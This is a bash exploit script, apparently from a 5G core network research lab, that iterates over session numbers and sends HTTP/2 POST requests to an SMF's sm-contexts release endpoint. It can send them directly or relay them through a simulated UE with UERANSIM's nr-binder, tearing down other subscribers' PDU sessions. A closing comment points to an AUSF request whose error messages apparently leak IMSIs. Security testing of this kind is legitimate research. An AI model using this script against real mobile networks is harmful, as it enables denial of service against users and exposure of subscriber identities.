#!/bin/bash

interface="enp0s3"
smf_ip="10.0.14.1"
start=0
end=10
while getopts "s:e:a:i:" opt; do
        case $opt in
				s) 	
						start="$OPTARG"
						;;
				e)	
						end="$OPTARG"	
						;;
				a)	
						smf_ip="$OPTARG"
						;;
                i)
                        interface="$OPTARG"
                        ;;
                \?)
                        echo "Invalid option: -$OPTARG, valid options are -s -e (start and end numbers to check sessions for ue imsi), -i (interface to use default enp0s3) and -a (smf ip) " >&2
                        exit 1
                        ;;
        esac
done


uri=":7777/nsmf-pdusession/v1/sm-contexts/"

UGreen='\033[0;32m'
UYellow='\033[0;33m'
color_off='\033[0m'

if [[ "$interface" == "enp0s3" ]]; then
	nghttp_call="nghttp --header=':method: POST' --header='Content-Type: application/json' -d json/smf_post_2 http://$smf_ip"
	for ((i=start; i<=end; i++)); do
	    to_call="$nghttp_call$uri$i/release"
	    echo -e "$color_off" $to_call
	    echo "$to_call" | bash
	    #$to_call
	    #echo "$result"	
    done
    exit 1
else
	ip=`/home/lily/5G/SHARED/Tools/get_ip_of_ue.sh $interface`
	if [ $? -eq 1 ]; then
		echo $interface " not a valid interface, valid is either enp0s3 or a ue address or name."
		exit 1
	fi
	cd /home/lily/UERANSIM/build
	if [ ! -e "tmp_sbi_call.sh" ]
	then 
	    touch tmp_sbi_call.sh
	    sudo chmod +x tmp_sbi_call.sh
	fi    
	binder_call="./nr-binder $ip ./tmp_sbi_call.sh"
	for ((i=start; i<=end; i++)); do
	    nghttp_call="nghttp --header=':method: POST' --header='Content-Type: application/json' -d /home/lily/5G/UE_VM/Exploit_Scripts/SBI/json/smf_post_2 http://$smf_ip"
	    to_call="$nghttp_call$uri$i/release"
	    printf "#!/bin/sh \n $to_call" > tmp_sbi_call.sh
	    echo -e "$color_off" $binder_call 
	    cat tmp_sbi_call.sh 
	    #echo "$to_call" | bash
	    $binder_call
	    #echo "$result"	
    done
    echo "" > tmp_sbi_call.sh
    exit 1
	
	
fi

#nghttp --header=':method: PUT' --header='Content-Type: application/json' -d json/ausf_put http://10.0.4.1:7777/nausf-auth/v1/ue-authentications/4/5g-aka-confrimation
#cycle through ints the error messages returns the imsis


